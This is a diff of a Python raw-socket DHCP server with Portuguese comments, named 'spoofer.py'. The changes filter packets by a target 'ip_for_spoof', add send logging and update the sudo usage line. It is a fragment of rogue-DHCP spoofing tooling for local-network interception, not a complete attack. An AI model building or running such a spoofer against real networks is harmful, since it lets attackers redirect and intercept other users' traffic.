@@ -1,7 +1,6 @@
 import socket
 import struct
 import fcntl
-import os
 import array
 
 # Definição dos tamanhos dos buffers de leitura e escrita
@@ -87,6 +86,10 @@ class DHCPServer:
             ether_type = struct.unpack('!H', packet[12:14])[0]
             if ether_type == ETHER_TYPE_IPv4:
                 ip_header = packet[14:34]
+                dst_ip = socket.inet_ntoa(ip_header[16:20])
+                if dst_ip != self.ip_for_spoof:
+                    continue
+
                 ip_protocol = struct.unpack('!B', ip_header[9:10])[0]
                 if ip_protocol == 17:  # Protocolo UDP
                     udp_header = packet[34:42]
@@ -151,13 +154,14 @@ class DHCPServer:
 
         self.log_dhcp_response()
 
-
     # Método para enviar o buffer de escrita
     def send_write_buffer(self):
         to = (self.interface_name, self.ifindex)
         send_sockfd = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
         send_sockfd.bind(to)
+        print("Enviando pacote DHCP...")
         send_sockfd.send(self.write_buffer)
+        print("Pacote DHCP enviado.")
         send_sockfd.close()
 
     # Método para construir um ACK DHCP
@@ -245,7 +249,7 @@ class DHCPServer:
 if __name__ == "__main__":
     import sys
     if len(sys.argv) < 3:
-        print("Uso: ./main <interface_name> <ip_for_spoof>")
+        print("Uso: sudo python3 spoofer.py <interface_name> <ip_for_spoof>")
         sys.exit(1)
 
     # Cria uma instância do servidor DHCP e executa
